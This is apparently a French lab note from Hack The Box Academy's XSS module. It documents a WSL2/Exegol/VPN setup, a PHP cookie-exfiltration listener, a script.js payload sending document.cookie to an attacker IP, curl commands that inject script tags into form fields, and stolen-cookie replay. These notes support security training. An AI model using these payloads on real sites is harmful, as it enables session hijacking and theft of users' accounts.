---

titre: "Outillage — WSL2, Exegol, VPN HTB & serveur d'exfiltration"

plateforme: "Hack The Box Academy"

module: "Cross-Site Scripting (XSS)"

date: 2026-06-30

tags: [Outillage, WSL2, Exegol, Docker, OpenVPN, HTB, curl, PHP, Setup, Notes]

---

  

# Outillage — WSL2, Exegol, VPN HTB & serveur d'exfiltration

  

> Note **transverse** (réutilisable pour tout lab HTB, pas seulement XSS). Documente la chaîne complète : environnement WSL2 → conteneur Exegol → VPN → serveur d'exfiltration → soumission via `curl`. Référencée depuis [[XSS — Exfiltration de cookies (Session Hijacking)]].

  

---

  

## 1. Vue d'ensemble de la stack

  

```

Windows 11

  └─ WSL2 (Ubuntu)                 ← kernel Linux, monte /dev/net/tun, /mnt/c/

       └─ Docker

            └─ Exegol (conteneur "web")   ← réseau Host, privileged

                 ├─ OpenVPN → tunnel HTB (tun0, 10.10.x.x)

                 ├─ serveur PHP (exfiltration, port 8080)

                 └─ curl (recon + injection)

```

  

Trois couches d'environnement à **ne jamais confondre** (cf. §7 sur les prompts) :

1. **Windows** (où se télécharge le `.ovpn`).

2. **WSL2** (qui voit `/mnt/c/` et le vrai `~/.exegol/`).

3. **Conteneur Exegol** (où l'on attaque ; pas de `/mnt/c/`, `~` = `/root`).

  

---

  

## 2. Exegol — rappel

  

**Exegol** = environnement de pentest packagé en **conteneurs Docker** (alternative « propre et jetable » à une VM Kali). On choisit une **image** selon le besoin :

  

| Image | Usage |

|---|---|

| `web` | pentest web (Burp, outils HTTP…) ← utilisée ici |

| `osint` | reconnaissance OSINT |

| `light` / `full` / `nightly` | minimal / complet / dernière build |

| `ad` | Active Directory |

  

Concepts clés :

- **Workspace** : dossier de travail persistant, monté côté hôte dans `~/.exegol/workspaces/<conteneur>/` ↔ `/workspace` dans le conteneur.

- **My resources** (`/opt/my-resources/`) : montage **partagé entre tous les conteneurs** et **persistant** → idéal pour stocker un `.ovpn`, des scripts récurrents.

- **Privileged** : capabilities Docker complètes (nécessaire pour le VPN, cf. §4).

  

### Commandes essentielles

  

```bash

exegol start <conteneur>                 # démarre + ouvre un shell interactif (zsh)

exegol start <conteneur> <image> [opts]  # crée un conteneur depuis une image

exegol exec <conteneur> "<cmd>"          # exécute UNE commande ponctuelle (non interactif)

exegol exec <conteneur> zsh              # ouvre un shell supplémentaire

exegol stop <conteneur>

exegol remove <conteneur>

exegol info                              # liste conteneurs/images

```

  

> ⚠️ **`exec` ≠ shell interactif** : `exegol exec web zsh` rend parfois la main immédiatement (« End of the command ») au lieu d'ouvrir un shell qui reste. Pour un shell qui **persiste** (ex. laisser tourner un serveur), utiliser **`exegol start web`**.

  

---

  

## 3. Transfert du `.ovpn` : Windows → WSL → conteneur

  

Le fichier VPN tombe dans le **Downloads Windows**. Le conteneur **ne voit pas** `/mnt/c/` — seul WSL le voit. Donc on copie **depuis WSL** :

  

```bash

# Dans WSL (prompt user@MSI:...$), PAS dans le conteneur :

ls /mnt/c/Users/                                   # retrouver son user Windows

cp /mnt/c/Users/alban/Downloads/*.ovpn ~/.exegol/workspaces/web/

ls -la ~/.exegol/workspaces/web/                   # vérifier

```

  

Le fichier apparaît alors dans `/workspace/` côté conteneur.

  

> 💡 **Pourquoi ne pas bosser dans `/mnt/c/`** : (1) **lenteur** (traduction 9P/drvfs entre Windows et Linux), (2) **permissions** Windows que des outils comme OpenVPN refusent. Réflexe : copier vers le FS Linux natif puis travailler de là.

  

> ⚠️ **Piège vécu** : `exegol remove` + recréation **réinitialise le workspace** → le `.ovpn` copié peut disparaître. Solution durable : le ranger dans `/opt/my-resources/` (partagé/persistant) plutôt que dans le workspace.

  

---

  

## 4. VPN HactTheBox sous WSL2 — le parcours du combattant

  

### 4.1 TCP/443 vs UDP

  

Au téléchargement, HTB propose **UDP** (souvent 1337) ou **TCP/443**.

  

| Protocole | Avantage | Inconvénient |

|---|---|---|

| UDP | plus rapide (moins d'overhead) | bloqué par certains pare-feux/proxys |

| **TCP/443** | **passe partout** (se déguise en HTTPS) | légèrement plus lent (retransmissions TCP) |

  

→ TCP/443 = bon réflexe en réseau restrictif (campus, entreprise). Pour HTB Academy la différence de latence est négligeable.

  

### 4.2 Le device TUN — l'obstacle WSL2

  

OpenVPN crée son tunnel via l'interface **`/dev/net/tun`**. WSL2 **ne l'expose pas toujours** par défaut. Symptômes successifs rencontrés :

  

**Erreur 1 — device absent :**

```

ERROR: Cannot open TUN/TAP dev /dev/net/tun: No such file or directory (errno=2)

```

Le **module** `tun` peut être chargé (`lsmod | grep tun` → `tun ...`) sans que le **device** existe. On le crée à la main :

```bash

sudo mkdir -p /dev/net

sudo mknod /dev/net/tun c 10 200      # c = character device, major 10, minor 200 (valeurs standard TUN)

sudo chmod 600 /dev/net/tun

ls -la /dev/net/tun                   # → crw------- ... 10, 200

```

  

**Subtilité** : créer le device **dans WSL** ne le rend pas forcément visible **dans le conteneur**. Vérifier *depuis le conteneur* :

```bash

ls -la /dev/net/tun                   # dans le conteneur : "No such file or directory" possible

```

S'il manque côté conteneur, le recréer **dans le conteneur** (root, donc sans sudo) :

```bash

mkdir -p /dev/net && mknod /dev/net/tun c 10 200 && chmod 600 /dev/net/tun

```

  

**Erreur 2 — device présent mais permission refusée :**

```

ERROR: Cannot ioctl TUNSETIFF tun: Operation not permitted (errno=1)

```

Là le device existe, mais **configurer une interface TUN exige la capability `CAP_NET_ADMIN`**. Un conteneur Exegol **non privilégié** (`Privileged: Off`) ne l'a pas → `mknod` crée le fichier mais ne donne pas le droit de l'utiliser. **Solution** : recréer le conteneur **privilégié** :

```bash

exit

exegol stop web

exegol remove web

exegol start web web --privileged       # "Privileged: On 🔥" → toutes les capabilities

```

En mode privileged, Exegol gère en général le device TUN tout seul (plus besoin du `mknod` manuel).

  

### 4.3 Lancer le VPN

  

```bash

cd /workspace

openvpn academy-regular.ovpn            # root dans le conteneur → pas de sudo

```

On attend la ligne :

```

Initialization Sequence Completed

```

→ tunnel monté. **Laisser ce shell tourner** (il maintient la connexion ; un Ctrl+C la coupe).

  

### 4.4 Vérifier la connectivité

  

Dans un **second** shell :

```bash

ip a show tun0                          # → IP du tunnel, ex. 10.10.17.155

ping -c 2 <IP_TARGET>                   # ex. 10.129.42.117

```

- `tun0` doit porter une IP **`10.10.x.x`** (réseau VPN HTB).

- Le ping de la target confirme que le routage fonctionne.

  

> ⚠️ **L'IP `tun0` peut changer** entre deux sessions VPN. **Toujours la re-vérifier** avant d'injecter des payloads : une IP périmée = sondes mortes = « rien dans les logs » sans raison apparente. (Piège vécu : injection vers `10.10.17.155` après changement d'heure/session.)

  

---

  

## 5. Le serveur d'exfiltration (PHP)

  

### Mise en place

  

```bash

mkdir -p /workspace/xss && cd /workspace/xss

  

# index.php : récepteur de cookies (cf. note Session Hijacking pour le détail)

cat > index.php << 'EOF'

<?php

if (isset($_GET['c'])) {

    $list = explode(";", $_GET['c']);

    foreach ($list as $key => $value) {

        $cookie = urldecode($value);

        $file = fopen("cookies.txt", "a+");

        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");

        fclose($file);

    }

}

?>

EOF

  

# script.js : payload d'exfiltration (IP:PORT à reporter !)

echo "new Image().src='http://10.10.17.155:8080/index.php?c='+document.cookie;" > script.js

  

php -S 0.0.0.0:8080                      # serveur web, sert le dossier courant

```

  

### Choix du port : 80 occupé → 8080

  

L'image `web` d'Exegol lance déjà un service sur le **port 80** :

```

Failed to listen on 0.0.0.0:80 (reason: Address already in use)

```

Deux options :

- **Libérer le 80** : `ss -tlnp | grep ':80'` → `kill <PID>`.

- **Basculer sur 8080** (retenu) : `php -S 0.0.0.0:8080`.

  

> ⚠️ **Si on change de port, le reporter PARTOUT** : dans `script.js` (`...:8080/index.php`) **et** dans chaque payload de sonde (`<script src=http://IP:8080/champ>`). L'oubli du `:8080` est l'erreur la plus fréquente.

  

### Lire les logs = « voir du mouvement »

  

`php -S` affiche **en direct** chaque requête reçue, une ligne par requête :

```

[date] 10.129.42.117:34662 [200]: GET /url

```

- **IP source** : `10.129.x.x` = la **target/victime** ; `10.10.x.x` = **soi-même** (test). Ne pas confondre.

- **chemin** : la sonde nommée → identifie le champ vulnérable.

  

Test du listener (depuis un autre shell) :

```bash

curl http://10.10.17.155:8080/ping-test     # doit apparaître instantanément dans les logs

```

  

---

  

## 6. `curl` — recon et injection sans navigateur

  

### Reconnaissance d'un formulaire

  

```bash

# Code HTTP d'une page (200 / 301 / 404 / 000=pas de réponse)

curl -s -o /dev/null -w "%{http_code}\n" http://TARGET/path

  

# Voir le HTML brut

curl -s http://TARGET/path | head -40

  

# Extraire les champs d'un formulaire

curl -s http://TARGET/path | grep -iE 'input|name=|form|action|comment_post_ID'

```

  

### Énumérer des chemins

  

```bash

for p in / /index.php /hijacking/ /hijacking/index.php /login.php /assessment/; do

  code=$(curl -s -o /dev/null -w "%{http_code}" http://TARGET$p)

  echo "$code  $p"

done

```

  

### Soumettre un formulaire

  

| Option | Rôle |

|---|---|

| `--data-urlencode 'k=v'` | encode proprement les caractères spéciaux (`<`, `>`, `"`, `/`) |

| `-G` | envoie les `--data` en **GET** (dans l'URL) — pour `method='get'` |

| *(sans `-G`)* | envoie en **POST** — pour `method='post'` (ex. WordPress) |

| `-i` | affiche les **headers** de réponse (vérifier `302` vs `200`) |

| `-b "k=v"` | envoie un **cookie** (rejouer une session volée) |

| `-s` | mode silencieux (pas de barre de progression) |

  

**Exemple GET (formulaire `method=get`) :**

```bash

curl -s "http://TARGET/hijacking/index.php" \

  --data-urlencode 'imgurl="><script src=http://OUR_IP:8080/imgurl></script>' \

  --data-urlencode "email=test@test.com" \

  -G

```

  

**Exemple POST (commentaire WordPress) :**

```bash

curl -s -i "http://TARGET/assessment/wp-comments-post.php" \

  --data-urlencode 'comment=hello' \

  --data-urlencode 'url="><script src=http://OUR_IP:8080/url></script>' \

  --data-urlencode 'email=test@test.com' \

  --data-urlencode 'comment_post_ID=8' \

  --data-urlencode 'comment_parent=0'

```

  

**Rejouer un cookie volé :**

```bash

curl -s "http://TARGET/path" -b "cookie=VALEUR_VOLEE" | grep -iE 'flag|HTB|welcome'

```

  

---

  

## 7. Méthodologie multi-shells & repérage d'environnement

  

On a besoin de **plusieurs shells en parallèle** :

  

| Shell | Rôle | Ne pas |

|---|---|---|

| 1 | `openvpn ...` (VPN up) | fermer / Ctrl+C |

| 2 | `php -S 0.0.0.0:8080` (listener) | fermer / Ctrl+C / taper dedans |

| 3+ | `curl`, `cat`, `ip a`… (commandes) | — |

  

Ouvrir un shell supplémentaire dans le conteneur : `exegol exec web zsh` (depuis WSL) ou `exegol start web`.

  

### Lire le prompt pour savoir où l'on est

  

| Prompt | Environnement | Accès `/mnt/c/` ? | `~` = |

|---|---|---|---|

| `user@MSI:...$` | **WSL** | ✅ oui | `/home/user` |

| `[date] exegol-web /workspace #` | **Conteneur** | ❌ non | `/root` |

  

> Confusions vécues : tenter `cp /mnt/c/...` **dans le conteneur** (échec : `no matches found`), ou croire être entré dans le conteneur après `exegol exec` alors qu'on était resté dans WSL. **Toujours lire le prompt avant une commande sensible au contexte.**

  

---

  

## 8. Checklist de session (réutilisable)

  

```

[ ] Conteneur Exegol démarré (privileged si VPN)        exegol start web web --privileged

[ ] .ovpn présent dans /workspace (ou /opt/my-resources)

[ ] /dev/net/tun présent DANS le conteneur              ls -la /dev/net/tun

[ ] VPN up                                              openvpn *.ovpn → "Initialization Sequence Completed"

[ ] IP tun0 notée (ET reportée dans script.js)          ip a show tun0

[ ] Target spawnée + joignable                          ping -c2 <TARGET>

[ ] Listener up sur le bon port                         php -S 0.0.0.0:8080

[ ] Listener testé                                       curl http://OUR_IP:8080/ping

[ ] cookies.txt vidé avant l'attaque réelle             rm -f cookies.txt

```

  

---

  

## 9. Récap des pièges (tous environnements)

  

| Piège | Signal | Correctif |

|---|---|---|

| Device TUN absent | `Cannot open TUN/TAP dev` | `mknod /dev/net/tun c 10 200` (dans le conteneur) |

| Capability manquante | `Cannot ioctl TUNSETIFF: Operation not permitted` | recréer le conteneur `--privileged` |

| Port 80 occupé | `Address already in use` | port 8080 (et le reporter partout) |

| `.ovpn` introuvable côté conteneur | `no matches found /mnt/c/...` | copier **depuis WSL**, pas le conteneur |

| Workspace réinitialisé | `/workspace` vide après remove | recopier ou utiliser `/opt/my-resources/` |

| IP tun0 changée | sondes muettes sans raison | `ip a show tun0` + MAJ `script.js` |

| Mauvais shell | `cp /mnt/c` échoue, ou shell qui « sort » | lire le prompt (WSL vs conteneur) |

| Serveur + curl même shell | la 2ᵉ commande ne part pas | un shell par rôle |

  

---

  

## Liens

  

- [[XSS — Exfiltration de cookies (Session Hijacking)]]

- [[XSS — Bypass & Filter Evasion (WAF, Sanitizers)]]

- [[Cross-Site Scripting (XSS) — Fondamentaux, Stored & Reflected]]